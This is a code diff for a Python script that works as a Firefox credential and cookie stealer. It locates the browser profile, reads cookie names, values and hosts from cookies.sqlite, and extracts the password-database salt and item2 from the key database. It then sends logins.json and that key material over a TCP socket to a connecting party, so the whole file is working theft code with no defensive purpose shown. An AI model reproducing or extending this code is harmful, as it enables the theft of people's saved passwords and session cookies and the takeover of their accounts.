@@ -1,16 +1,22 @@
 from abc import ABC, abstractmethod
-import os, socket, platform, sqlite3, json;
+import os, socket, platform, sqlite3;
 
 
 # * Classes to detect Operating System
 class OSInterface(ABC):
+
     @abstractmethod
     def DetectOperatingSystem(self):
         pass
 
 
 class OSDetector(OSInterface):
-    def DetectOperatingSystem(self):
+
+    def __init__(self):
+        pass
+
+    @staticmethod
+    def DetectOperatingSystem():
         return platform.system();
 
 
@@ -18,15 +24,18 @@ class OSDetector(OSInterface):
 # * Classes to search profile directories in different browsers
 class ProfileDirectoryFinder(ABC):
     @abstractmethod
-    def FindProfileDirectoryInLinux(self):
+    def FindProfileDirectoryInLinux():
         pass
 
     @abstractmethod 
-    def FindProfileDirectoryInWindows(self):
+    def FindProfileDirectoryInWindows():
         pass
 
 
 class FirefoxProfileFinder(ProfileDirectoryFinder):
+    
+    def __init__(self):
+        pass
 
     def FindProfileDirectoryInLinux(self):
 
@@ -82,9 +91,9 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
 
     def GetCookiesInLinux(self):
 
-        try: 
+        # try: 
 
-            browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();
+            browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
             cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite");
 
 
@@ -92,7 +101,8 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
                 raise FileNotFoundError("Cookies database not found!");
 
 
-            connection = sqlite3.connect(browserDirectory)
+
+            connection = sqlite3.connect(cookiesDbPath)
             cursor = connection.cursor()
             cursor.execute('SELECT name, value, host FROM moz_cookies')
             cookies = cursor.fetchall()
@@ -100,9 +110,9 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
 
             return cookies;
 
-        except Exception as e:
-            print(e)
-            return False;
+        # except Exception as e:
+        #     print(f"{e} xd")
+        #     return False;
             
 
 
@@ -149,31 +159,19 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
             salt, item2= self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password'");
 
             
-            print(loginsFilePath)        
-
-
-            
+            return salt, item2, loginsFilePath;
             
            
-            
-            
-            
-            
         except Exception as e:
             print(e)
         
 
 
-
-
     def GetPasswordsInWindows(self):
-        
-        return "Pipe Porrero"
+        return "Logic"
 
         
     def __ExecuteSQLQuery(self, dbPath, sqlQuery):
-
-
         with sqlite3.connect(dbPath) as db:
 
             cursor = db.cursor()
@@ -181,8 +179,6 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
             results = cursor.fetchone()
 
         return results;
-
-
 
 
 
@@ -201,22 +197,25 @@ class SocketSender(ABC):
     
 class BrowserDataSender(SocketSender):
 
-    def __init__(self, ip, port):
+    def __init__(self, port, ip=''):
         self._ip = ip;
         self._port = port;
+        self.__serverSocket = None;
+        self.__clientSocket = None;
+
         
 
 
-    def __EstablishConnection(self):
+    def EstablishConnection(self):
         #Create Connection 
         serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
-        serverAddress = (self.ip, self._port);        
-        serverSocket.bind(serverAddress);
 
+        serverAddress = (self._ip, self._port);        
+        serverSocket.bind(serverAddress);
         serverSocket.listen();
 
-        clientSocket, clientAddress = serverSocket.accept()
-        return serverSocket, clientSocket
+        self.__clientSocket, clientAddress = serverSocket.accept()
+        self.__serverSocket = serverSocket;
 
 
 
@@ -226,64 +225,26 @@ class BrowserDataSender(SocketSender):
 
         with open(path, "r") as File:
             dataFile = File.read();
-
-        serverSocket, clientSocket = self.__EstablishConnection()
-
         
         try:
-
-            clientSocket.sendall(str(dataFile).encode());
+            self.__clientSocket.sendall(str(dataFile).encode());
 
         except Exception as e:
-            print("Error with connection!" + e);
-
-        finally:
-            clientSocket.close();
-            serverSocket.close();
-
+            print("Error!" + e);
 
 
     def SendPythonData(self, data={}):
-
-        serverSocket, clientSocket = self.__EstablishConnection()
-
         
         try:
-
-            clientSocket.sendall(str(data).encode());
-
+            self.__clientSocket.sendall(str(data).encode());
+            
         except Exception as e:
-            print("Error with connection!" + e);
-
-        finally:
-            clientSocket.close();
-            serverSocket.close();
+            print("Error! " + e);
 
 
-               
-
-
-
-
-
-
-
-        
-
-       
-
-
-
-
-
-
-        
-
-
-
-
-
-
+    def CloseConnection(self):
+        self.__clientSocket.close();
+        self.__serverSocket.close();
 
 
 
@@ -291,28 +252,36 @@ class BrowserDataSender(SocketSender):
 def Main():
 
 
-    sender = BrowserDataSender("192.168.1.1", 3000);
 
-    sender.SendFileData("/home/xander/.mozilla/firefox/7ik0vvhp.default-esr/logins.json");
-
+    if(not OSDetector.DetectOperatingSystem() == "Linux"):
+        pass
 
     
+    browserSearcher = FirefoxProfileFinder();
+    CookiesGetter = FirefoxCookiesGetter(browserSearcher);
+    sender = BrowserDataSender(3000);
+    
+
+    passwords = FirefoxPasswordsGetter(browserSearcher);
+    cookies = CookiesGetter.GetCookiesInLinux()
+
+    PasswordsGetter = FirefoxPasswordsGetter(browserSearcher)
+    salt, item2, loginsFilePath = PasswordsGetter.GetPasswordInLinux()
 
 
 
 
+    sender.EstablishConnection();
+    sender.SendFileData(loginsFilePath); 
+    sender.SendPythonData(data={
+       "salt": salt,
+       "item2": item2,
+    });
 
 
+    sender.CloseConnection();
 
-
-
-
-    # finder = FirefoxProfileFinder();
-
-    # xd = FirefoxPasswordsGetter(finder);
-
-    # xd.GetPasswordInLinux()
-
+    
 
 
 
